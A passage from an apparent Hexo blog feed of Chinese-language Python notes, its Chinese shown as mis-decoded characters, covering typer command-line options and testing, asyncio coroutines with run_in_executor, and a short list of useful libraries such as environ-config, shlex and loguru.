class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-symbol">accept:</span> Optional[bool] = typer.Option(None, <span class="hljs-string">&quot;--accept/--reject&quot;</span>, <span class="hljs-string">&quot;-a/-A&quot;</span>)</span></span>)<span class="hljs-symbol">:</span></span></code></pre></div></div><p>é»˜è®¤æƒ…å†µä¸‹ç»™å‡ºçš„å‚è€ƒå€¼æ˜¯<code>--accept/--no-accept</code> ä¿®æ”¹æˆ<code>--accept/--reject</code> å’Œ çŸ­å‘½ä»¤ <code>-a/-A</code></p><h3 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h3><p>åªåŒºæšä¸¾ä¸­çš„å€¼</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line">from enum import Enum</span><span class="line"></br></span><span class="line">import typer</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NeuralNetwork</span>(<span class="hljs-title">str</span>, <span class="hljs-title">Enum</span>):</span></span><span class="line">    simple = <span class="hljs-string">&quot;simple&quot;</span></span><span class="line">    conv = <span class="hljs-string">&quot;conv&quot;</span></span><span class="line">    lstm = <span class="hljs-string">&quot;lstm&quot;</span></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-symbol">network:</span> NeuralNetwork = typer.Option(NeuralNetwork.simple, case_sensitive=False)</span></span>):</span><span class="line">    typer.echo(f<span class="hljs-string">&quot;Training neural network of type: &#123;network.value&#125;&quot;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:</span><span class="line">    typer.run(main)</span></code></pre></div></div><ul><li>case_sensitive å¤§å°å†™æ•æ„Ÿ</li></ul><h3 id="path"><a href="#path" class="headerlink" title="path"></a>path</h3><p>å¯ä»¥ç›´æ¥å¯¹è·¯å¾„è¿›è¡ŒéªŒè¯</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line">import typer</span><span class="line">from pathlib import Path</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    <span class="hljs-symbol">config:</span> Path = typer.Option(</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        ...,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        exists=True,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        file_okay=True,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        dir_okay=False,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        writable=False,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        readable=True,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        resolve_path=True,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    )</span></span></span><span class="line">):</span><span class="line">    text = config.read_text(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)</span><span class="line">    typer.echo(f<span class="hljs-string">&quot;Config file contents: &#123;text&#125;&quot;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:</span><span class="line">    typer.run(main)</span></code></pre></div></div><ul><li>exists æ˜¯å¦å­˜åœ¨</li><li>file_okay å¯ä»¥æ˜¯æ–‡ä»¶</li><li>dir_okay å¯ä»¥æ˜¯æ–‡ä»¶å¤¹</li><li>writable æ˜¯å¦å¯å†™</li><li>readable æ˜¯å¦å¯è¯»</li><li>resolve_path å½“ä¸ºTrueï¼Œåˆ™ä¼šè½¬åŒ–æˆç»å¯¹è·¯å¾„</li></ul><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>å¯ä»¥ç›´æ¥è¿”å›ä¸€ä¸ª<code>fi</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">config: typer.FileText = typer.Option(<span class="hljs-params">..., mode=<span class="hljs-string">&quot;a&quot;</span></span>)</span>):</span></span><span class="line">    config.write(<span class="hljs-string">&#x27;This is a single line\n&#x27;</span>)</span></code></pre></div></div><ul><li>mode å®šä¹‰æ“ä½œç±»å‹</li></ul><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>å¯ä»¥ä½¿ç”¨<code>pytest</code>æ¥å¯¹<code>typer</code>è¿›è¡Œæµ‹è¯•</p><h3 id="æµ‹è¯•è¾“å‡º"><a href="#æµ‹è¯•è¾“å‡º" class="headerlink" title="æµ‹è¯•è¾“å‡º"></a>æµ‹è¯•è¾“å‡º</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> typer.testing <span class="hljs-keyword">import</span> CliRunner</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">from</span> .main <span class="hljs-keyword">import</span> app</span><span class="line"></br></span><span class="line">runner = CliRunner()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_app</span>():</span></span><span class="line">    result = runner.invoke(app, [<span class="hljs-string">&quot;Camila&quot;</span>, <span class="hljs-string">&quot;--city&quot;</span>, <span class="hljs-string">&quot;Berlin&quot;</span>])</span><span class="line">    <span class="hljs-keyword">assert</span> result.exit_code == <span class="hljs-number">0</span></span><span class="line">    <span class="hljs-keyword">assert</span> <span class="hljs-string">&quot;Hello Camila&quot;</span> <span class="hljs-keyword">in</span> result.stdout</span><span class="line">    <span class="hljs-keyword">assert</span> <span class="hljs-string">&quot;Let&#x27;s have a coffee in Berlin&quot;</span> <span class="hljs-keyword">in</span> result.stdout</span></code></pre></div></div><h3 id="æµ‹è¯•è¾“å…¥"><a href="#æµ‹è¯•è¾“å…¥" class="headerlink" title="æµ‹è¯•è¾“å…¥"></a>æµ‹è¯•è¾“å…¥</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> typer.testing <span class="hljs-keyword">import</span> CliRunner</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">from</span> .main <span class="hljs-keyword">import</span> app</span><span class="line"></br></span><span class="line">runner = CliRunner()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_app</span>():</span></span><span class="line">    result = runner.invoke(app, [<span class="hljs-string">&quot;Camila&quot;</span>], <span class="hljs-built_in">input</span>=<span class="hljs-string">&quot;camila@example.com\n&quot;</span>)</span><span class="line">    <span class="hljs-keyword">assert</span> result.exit_code == <span class="hljs-number">0</span></span><span class="line">    <span class="hljs-keyword">assert</span> <span class="hljs-string">&quot;Hello Camila, your email is: camila@example.com&quot;</span> <span class="hljs-keyword">in</span> result.stdout</span></code></pre></div></div><h2 id="å…³äºæ‰“åŒ…"><a href="#å…³äºæ‰“åŒ…" class="headerlink" title="å…³äºæ‰“åŒ…"></a>å…³äºæ‰“åŒ…</h2><ul><li><a href="https://typer.tiangolo.com/tutorial/package/">è¿™é‡Œ</a>æ˜¯typeré‡Œé¢æä¾›çš„æ‰“åŒ…æ–¹æ³•</li><li><a href="/2022/02/24/poetry-%E5%8C%85%E7%AE%A1%E7%90%86%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/" title="poetry åŒ…ç®¡ç†ä½¿ç”¨æ–¹æ³•">poetry åŒ…ç®¡ç†ä½¿ç”¨æ–¹æ³•</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python å¼‚æ­¥IO</title>
      <link href="/2022/02/22/python-%E5%BC%82%E6%AD%A5IO/"/>
      <url>/2022/02/22/python-%E5%BC%82%E6%AD%A5IO/</url>
      
        <content type="html"><![CDATA[<p>ç›¸æ¯”äºå¤šçº¿ç¨‹ï¼Œåç¨‹æˆ–è€…å«å¾®çº¿ç¨‹(coroutine)ï¼Œè¿™æ ·çš„æ–¹å¼æ•ˆç‡æ›´é«˜ï¼Œå› ä¸ºæ²¡æœ‰åˆ‡æ¢çº¿ç¨‹çš„å¼€é”€ï¼Œä¸å­˜åœ¨å˜é‡å†²çªå’Œè¿›ç¨‹é”ç­‰é™åˆ¶ã€‚<br>å› ä¸ºåç¨‹æ˜¯ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œï¼Œé‚£æ€ä¹ˆåˆ©ç”¨å¤šæ ¸CPUå‘¢ï¼Ÿæœ€ç®€å•çš„æ–¹æ³•æ˜¯å¤šè¿›ç¨‹+åç¨‹ï¼Œæ—¢å……åˆ†åˆ©ç”¨å¤šæ ¸ï¼Œåˆå……åˆ†å‘æŒ¥åç¨‹çš„é«˜æ•ˆç‡ï¼Œå¯è·å¾—æé«˜çš„æ€§èƒ½ã€‚</p><ul><li><a href="https://blog.csdn.net/Likianta/article/details/90123678">ç®€å•å…¥é—¨ç†è§£</a></li></ul><h2 id="ç®€å•ä¾‹å­"><a href="#ç®€å•ä¾‹å­" class="headerlink" title="ç®€å•ä¾‹å­"></a>ç®€å•ä¾‹å­</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> threading</span><span class="line"><span class="hljs-keyword">import</span> asyncio</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_thread</span>(<span class="hljs-params">th</span>):</span></span><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(th)[<span class="hljs-number">2</span>:<span class="hljs-number">6</span>]</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello</span>():</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello world! (%s)&#x27;</span> % threading.currentThread())</span><span class="line">    r = <span class="hljs-keyword">await</span> print_thread(threading.currentThread())</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello %s&#x27;</span> % r)</span><span class="line">    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello again! (%s)&#x27;</span> % threading.currentThread())</span><span class="line"></br></span><span class="line">loop = asyncio.get_event_loop()</span><span class="line">tasks = [hello(), hello()]</span><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><span class="line">loop.close()</span></code></pre></div></div><p>æ‰§è¡Œç»“æœ</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-lisp codeBlockLines"><span class="line">Hello world! (<span class="hljs-name">&lt;_MainThread</span>(<span class="hljs-name">MainThread</span>, started <span class="hljs-number">12448</span>)&gt;)</span><span class="line">Hello Main</span><span class="line">Hello world! (<span class="hljs-name">&lt;_MainThread</span>(<span class="hljs-name">MainThread</span>, started <span class="hljs-number">12448</span>)&gt;)</span><span class="line">Hello Main</span><span class="line">(æš‚åœ<span class="hljs-number">1</span>ç§’)</span><span class="line">Hello again! (<span class="hljs-name">&lt;_MainThread</span>(<span class="hljs-name">MainThread</span>, started <span class="hljs-number">12448</span>)&gt;)</span><span class="line">Hello again! (<span class="hljs-name">&lt;_MainThread</span>(<span class="hljs-name">MainThread</span>, started <span class="hljs-number">12448</span>)&gt;)</span></code></pre></div></div><p>å¯ä»¥çœ‹åˆ°ï¼Œä½¿ç”¨çš„æ˜¯ä¸€ä¸ªè¿›ç¨‹ã€‚</p><ol><li><code>async</code>æ ‡è®°æŠŠä¸€ä¸ª<code>generator</code>æ ‡è®°ä¸º<code>coroutine</code>ç±»å‹</li><li>ä»<code>asyncio</code>æ¨¡å—ä¸­ç›´æ¥è·å–ä¸€ä¸ª<code>EventLoop</code>çš„å¼•ç”¨ï¼Œç„¶åæŠŠéœ€è¦æ‰§è¡Œçš„åç¨‹æ‰”åˆ°<code>EventLoop</code>ä¸­æ‰§è¡Œï¼Œå°±å®ç°äº†å¼‚æ­¥IOã€‚</li><li><code>await</code> ç­‰åŒäº <code>yeild from</code></li></ol><h2 id="åç¨‹ç°é˜¶æ®µæ‰€å­˜åœ¨çš„é—®é¢˜"><a href="#åç¨‹ç°é˜¶æ®µæ‰€å­˜åœ¨çš„é—®é¢˜" class="headerlink" title="åç¨‹ç°é˜¶æ®µæ‰€å­˜åœ¨çš„é—®é¢˜"></a>åç¨‹ç°é˜¶æ®µæ‰€å­˜åœ¨çš„é—®é¢˜</h2><p><code>await</code> åé¢è·Ÿçš„å¿…é¡»æ˜¯<code>Awaitable</code>æˆ–è€…æ˜¯å®ç°äº†<code>__await__</code>çš„ç±»ï¼Œå½“å‰å¤§éƒ¨åˆ†çš„æ•™ç¨‹å…¶å®éƒ½åªæ˜¯è®²äº†åç¨‹çš„åŸç†ï¼Œå¹¶ä¸”éƒ½æ˜¯ç”¨<code>syncio.sleep()</code>æ¥ä½œä¸ºæ¼”ç¤ºã€‚ä½†æ˜¯çœŸæ­£åˆ°ä½¿ç”¨ç¯å¢ƒçš„æ—¶å€™è¿˜æ˜¯ä¼šæŸæ‰‹æŸè„šï¼Œå¦‚æœæ²¡æœ‰å¯¹åº”çš„å¼‚æ­¥åº“ï¼Œé‚£ä¹ˆ<code>await</code>å°±æ— æ³•ä½¿ç”¨ã€‚</p><p>é‚£ä¹ˆæœ‰æ²¡æœ‰ä¸€ç§æŠ˜ä¸­çš„åŠæ³•å‘¢ï¼Ÿ</p><p>è¿˜æ˜¯æœ‰çš„ï¼Œ<a href="https://stackoverflow.com/questions/22190403/how-could-i-use-requests-in-asyncio">è¿™ç¯‡æ–‡è½¬</a>è®¨è®ºäº†å¦‚ä½•ç”¨éå¼‚æ­¥åº“æ¥è°ƒç”¨åç¨‹ã€‚</p><p>ç»™å‡ºçš„ä¾‹å­</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> asyncio</span><span class="line"><span class="hljs-keyword">import</span> requests</span><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_async</span>(<span class="hljs-params">callback</span>):</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inner</span>(<span class="hljs-params">func</span>):</span></span><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):</span></span><span class="line">            <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__exec</span>():</span></span><span class="line">                out = func(*args, **kwargs)</span><span class="line">                callback(out)</span><span class="line">                <span class="hljs-keyword">return</span> out</span><span class="line"></br></span><span class="line">            <span class="hljs-keyword">return</span> asyncio.get_event_loop().run_in_executor(<span class="hljs-literal">None</span>, __<span class="hljs-built_in">exec</span>)</span><span class="line"></br></span><span class="line">        <span class="hljs-keyword">return</span> wrapper</span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">return</span> inner</span><span class="line"></br></span><span class="line"></br></span><span class="line">response = []</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_callback</span>(<span class="hljs-params">*args</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;callback: &#x27;</span>, args)</span><span class="line">    response.append(args)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># Must provide a callback function, callback func will be executed after the func completes execution !!</span></span><span class="line"><span class="hljs-meta">@run_async(<span class="hljs-params">_callback</span>)</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">url</span>):</span></span><span class="line">    <span class="hljs-keyword">return</span> requests.get(url)</span><span class="line"></br></span><span class="line"></br></span><span class="line">get(<span class="hljs-string">&quot;https://google.com&quot;</span>)</span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Non blocking code ran !!&quot;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> response:</span><span class="line">    sleep(<span class="hljs-number">0.1</span>)</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;waiting for response...&#x27;</span>)</span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;get response: &#x27;</span>, response)</span><span class="line"></br></span><span class="line"><span class="hljs-comment">## output:</span></span><span class="line"><span class="hljs-comment">#Non blocking code ran !!</span></span><span class="line"><span class="hljs-comment">#waiting for response...</span></span><span class="line"><span class="hljs-comment">#waiting for response...</span></span><span class="line"><span class="hljs-comment">#waiting for response...</span></span><span class="line"><span class="hljs-comment">#waiting for response...</span></span><span class="line"><span class="hljs-comment">#waiting for response...</span></span><span class="line"><span class="hljs-comment">#callback:  (&lt;Response [200]&gt;,)</span></span><span class="line"><span class="hljs-comment">#waiting for response...</span></span><span class="line"><span class="hljs-comment">#get response:  [(&lt;Response [200]&gt;,)]</span></span></code></pre></div></div><p>å…¶ä¸­<code>loop.run_in_executor(None, func, *args)</code>å¯ä»¥å°†æ­£å¸¸å‡½æ•°è½¬åŒ–ä¸º<code>asyncio.Future</code>å¯¹è±¡ï¼Œ</p><blockquote><p>ä¸€ä¸ª Future ä»£è¡¨ä¸€ä¸ªå¼‚æ­¥è¿ç®—çš„æœ€ç»ˆç»“æœã€‚çº¿ç¨‹ä¸å®‰å…¨ã€‚<br>Future æ˜¯ä¸€ä¸ª awaitable å¯¹è±¡ã€‚åç¨‹å¯ä»¥ç­‰å¾… Future å¯¹è±¡ç›´åˆ°å®ƒä»¬æœ‰ç»“æœæˆ–å¼‚å¸¸é›†åˆæˆ–è¢«å–æ¶ˆã€‚</p></blockquote><h2 id="å¼‚æ­¥åº“"><a href="#å¼‚æ­¥åº“" class="headerlink" title="å¼‚æ­¥åº“"></a>å¼‚æ­¥åº“</h2><ul><li>aiomysql æ•°æ®åº“æ“ä½œ</li><li>aiohttp  httpè¯·æ±‚</li><li>aiofile  æ–‡ä»¶è¯»å†™</li><li>netdev  è¿œç¨‹è¿æ¥</li><li><a href="https://docs.sqlalchemy.org/en/14/orm/extensions/asyncio.html">sqlalchemy[asyncio]</a> å…³ç³»å‹æ•°æ®åº“</li></ul><h2 id="å¼‚æ­¥æµ‹è¯•"><a href="#å¼‚æ­¥æµ‹è¯•" class="headerlink" title="å¼‚æ­¥æµ‹è¯•"></a>å¼‚æ­¥æµ‹è¯•</h2><p>å®‰è£…<code>pytest-asyncio</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-meta">@pytest.mark.asyncio</span></span><span class="line"><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_main</span>():</span></span><span class="line">    ...</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python å®ç”¨åº“æ”¶é›†</title>
      <link href="/2022/02/18/python-%E5%AE%9E%E7%94%A8%E5%BA%93%E6%94%B6%E9%9B%86/"/>
      <url>/2022/02/18/python-%E5%AE%9E%E7%94%A8%E5%BA%93%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>è¿™ç¯‡æ–‡ç« æ˜¯å°†è‡ªå·±åœ¨æµè§ˆæºç çš„æ—¶å€™è§åˆ°çš„ä¸€äº›åº“æ”¶é›†èµ·æ¥å¤‡å¿˜ã€‚</p><p><img src="/2022/02/18/python-%E5%AE%9E%E7%94%A8%E5%BA%93%E6%94%B6%E9%9B%86/1.png"></p><h2 id="Python-å¸¸ç”¨åº“"><a href="#Python-å¸¸ç”¨åº“" class="headerlink" title="Python å¸¸ç”¨åº“"></a>Python å¸¸ç”¨åº“</h2><h3 id="inspect-æ£€æŸ¥ç°åœºå¯¹è±¡"><a href="#inspect-æ£€æŸ¥ç°åœºå¯¹è±¡" class="headerlink" title="inspect æ£€æŸ¥ç°åœºå¯¹è±¡"></a>inspect <strong>æ£€æŸ¥ç°åœºå¯¹è±¡</strong></h3><ul><li><a href="https://blog.csdn.net/NeverLate_gogogo/article/details/107752428">å¿«é€Ÿä¸Šæ‰‹</a></li></ul><p>inspect æ¨¡å—ä¹Ÿè¢«ç§°ä¸º æ£€æŸ¥ç°åœºå¯¹è±¡ã€‚è¿™é‡Œçš„é‡ç‚¹åœ¨äº â€œç°åœºâ€ äºŒå­—ï¼Œä¹Ÿå°±æ˜¯å½“å‰è¿è¡Œçš„çŠ¶æ€ã€‚<br>inspect æ¨¡å—æä¾›äº†ä¸€äº›å‡½æ•°æ¥äº†è§£ç°åœºå¯¹è±¡ï¼ŒåŒ…æ‹¬ æ¨¡å—ã€ç±»ã€å®ä¾‹ã€å‡½æ•°å’Œæ–¹æ³•ã€‚<br>inspect å‡½æ•°ä¸»è¦ç”¨äºä»¥ä¸‹å››ä¸ªæ–¹é¢: </p><ol><li>å¯¹æ˜¯å¦æ˜¯æ¨¡å—ã€æ¡†æ¶ã€å‡½æ•°è¿›è¡Œç±»å‹æ£€æŸ¥</li><li>è·å–æºç </li><li>è·å–ç±»æˆ–è€…å‡½æ•°çš„å‚æ•°ä¿¡æ¯</li><li>è§£æå †æ ˆ</li></ol><h3 id="eviron-config-è®¾ç½®å’Œè·å–å˜é‡"><a href="#eviron-config-è®¾ç½®å’Œè·å–å˜é‡" class="headerlink" title="eviron-config è®¾ç½®å’Œè·å–å˜é‡"></a>eviron-config <strong>è®¾ç½®å’Œè·å–å˜é‡</strong></h3><ul><li><a href="https://github.com/hynek/environ-config">å¿«é€Ÿä¸Šæ‰‹</a></li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> environ</span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-comment"># Extracts secrets from Vault-via-envconsul: &#x27;secret/your-app&#x27;:</span></span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>vault = environ.secrets.VaultEnvSecrets(vault_prefix=<span class="hljs-string">&quot;SECRET_YOUR_APP&quot;</span>)</span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>@environ.config(prefix=<span class="hljs-string">&quot;APP&quot;</span>)</span><span class="line"><span class="hljs-meta">... </span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AppConfig</span>:</span></span><span class="line"><span class="hljs-meta">... </span>   @environ.config</span><span class="line"><span class="hljs-meta">... </span>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DB</span>:</span></span><span class="line"><span class="hljs-meta">... </span>       name = environ.var(<span class="hljs-string">&quot;default_db&quot;</span>)</span><span class="line"><span class="hljs-meta">... </span>       host = environ.var(<span class="hljs-string">&quot;default.host&quot;</span>)</span><span class="line"><span class="hljs-meta">... </span>       port = environ.var(<span class="hljs-number">5432</span>, converter=<span class="hljs-built_in">int</span>)  <span class="hljs-comment"># Use attrs&#x27;s converters and validators!</span></span><span class="line"><span class="hljs-meta">... </span>       user = environ.var(<span class="hljs-string">&quot;default_user&quot;</span>)</span><span class="line"><span class="hljs-meta">... </span>       password = vault.secret()</span><span class="line">...</span><span class="line"><span class="hljs-meta">... </span>   env = environ.var()</span><span class="line"><span class="hljs-meta">... </span>   lang = environ.var(name=<span class="hljs-string">&quot;LANG&quot;</span>)  <span class="hljs-comment"># It&#x27;s possible to overwrite the names of variables.</span></span><span class="line"><span class="hljs-meta">... </span>   db = environ.group(DB)</span><span class="line"><span class="hljs-meta">... </span>   awesome = environ.bool_var()</span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>cfg = environ.to_config(</span><span class="line"><span class="hljs-meta">... </span>    AppConfig,</span><span class="line"><span class="hljs-meta">... </span>    environ=&#123;</span><span class="line"><span class="hljs-meta">... </span>        <span class="hljs-string">&quot;APP_ENV&quot;</span>: <span class="hljs-string">&quot;dev&quot;</span>,</span><span class="line"><span class="hljs-meta">... </span>        <span class="hljs-string">&quot;APP_DB_HOST&quot;</span>: <span class="hljs-string">&quot;localhost&quot;</span>,</span><span class="line"><span class="hljs-meta">... </span>        <span class="hljs-string">&quot;LANG&quot;</span>: <span class="hljs-string">&quot;C&quot;</span>,</span><span class="line"><span class="hljs-meta">... </span>        <span class="hljs-string">&quot;APP_AWESOME&quot;</span>: <span class="hljs-string">&quot;yes&quot;</span>,  <span class="hljs-comment"># true and 1 work too, everything else is False</span></span><span class="line"><span class="hljs-meta">... </span>        <span class="hljs-comment"># Vault-via-envconsul-style var name:</span></span><span class="line"><span class="hljs-meta">... </span>        <span class="hljs-string">&quot;SECRET_YOUR_APP_DB_PASSWORD&quot;</span>: <span class="hljs-string">&quot;s3kr3t&quot;</span>,</span><span class="line"><span class="hljs-meta">... </span>&#125;)  <span class="hljs-comment"># Uses os.environ by default.</span></span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>cfg</span><span class="line">AppConfig(env=<span class="hljs-string">&#x27;dev&#x27;</span>, lang=<span class="hljs-string">&#x27;C&#x27;</span>, db=AppConfig.DB(name=<span class="hljs-string">&#x27;default_db&#x27;</span>, host=<span class="hljs-string">&#x27;localhost&#x27;</span>, port=<span class="hljs-number">5432</span>, user=<span class="hljs-string">&#x27;default_user&#x27;</span>, password=&lt;SECRET&gt;), awesome=<span class="hljs-literal">True</span>)</span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>cfg.db.password</span><span class="line"><span class="hljs-string">&#x27;s3kr3t&#x27;</span></span></code></pre></div></div><h3 id="shlex-ç®€å•è¯æ³•åˆ†æ"><a href="#shlex-ç®€å•è¯æ³•åˆ†æ" class="headerlink" title="shlex ç®€å•è¯æ³•åˆ†æ"></a>shlex <strong>ç®€å•è¯æ³•åˆ†æ</strong></h3><ul><li><a href="https://docs.python.org/zh-cn/3/library/shlex.html">å¿«é€Ÿä¸Šæ‰‹</a></li></ul><p>å¸¸ç”¨<code>shlex.split</code> é…åˆ<code>subprocess.run</code>:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">subprocess.run(shlex.split(<span class="hljs-string">&quot;cat sendtext.txt&quot;</span>), stdout=subprocess.PIPE, universal_newlines=<span class="hljs-literal">True</span>) </span></code></pre></div></div><h3 id="loguru-æ›´å¼ºæ›´ç®€å•çš„æ—¥å¿—"><a href="#loguru-æ›´å¼ºæ›´ç®€å•çš„æ—¥å¿—" class="headerlink" title="loguru æ›´å¼ºæ›´ç®€å•çš„æ—¥å¿—"></a>loguru <strong>æ›´å¼ºæ›´ç®€å•çš„æ—¥å¿—</strong></h3><p>å¯ä»¥é¢å»å¤§é‡çš„é…ç½®æ“ä½œï¼Œé€»è¾‘æ¸…æ™°ç®€å•å¯é ã€‚å¹¶ä¸”æ”¯æŒå¤šè¿›ç¨‹ï¼Œæ”¯æŒè‰²å½©è¾“å‡ºã€‚</p><ul><li><a href="https://github.com/Delgan/loguru">Github</a></li><li><a href="https://loguru.readthedocs.io/en/stable/api/logger.html">å®˜æ–¹æ–‡æ¡£</a></li></ul><h3 id="pydantic-å¹³æ›¿dataclass"><a href="#pydantic-å¹³æ›¿dataclass" class="headerlink" title="pydantic å¹³æ›¿dataclass"></a>pydantic <strong>å¹³æ›¿dataclass</strong></h3><p>å¯ä»¥è¯´æ˜¯dataclassçš„å‡çº§ç‰ˆï¼Œæ”¯æŒç±»å‹æ£€æŸ¥ï¼Œæ”¯æŒjsonåºåˆ—åŒ–ï¼Œæ”¯æŒormç­‰ç­‰ã€‚</p><ul><li><a href="https://github.com/pydantic/pydantic">Github</a></li><li><a href="https://blog.csdn.net/swinfans/article/details/89629641">ä¸­æ–‡å®˜ç½‘ç¿»è¯‘</a></li></ul><h3 id="rich-å½©è‰²å¯Œæ–‡æœ¬"><a href="#rich-å½©è‰²å¯Œæ–‡æœ¬" class="headerlink" title="rich å½©è‰²å¯Œæ–‡æœ¬"></a>rich <strong>å½©è‰²å¯Œæ–‡æœ¬</strong></h3><ul><li><a href="/2022/03/22/python-rich-%E5%BA%93%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/" title="python rich åº“ä½¿ç”¨æ–¹æ³•">python rich åº“ä½¿ç”¨æ–¹æ³•</a></li></ul><p><a href="https://github.com/Textualize/rich/blob/master/README.cn.md">Rich</a> æ˜¯ä¸€ä¸ª Python 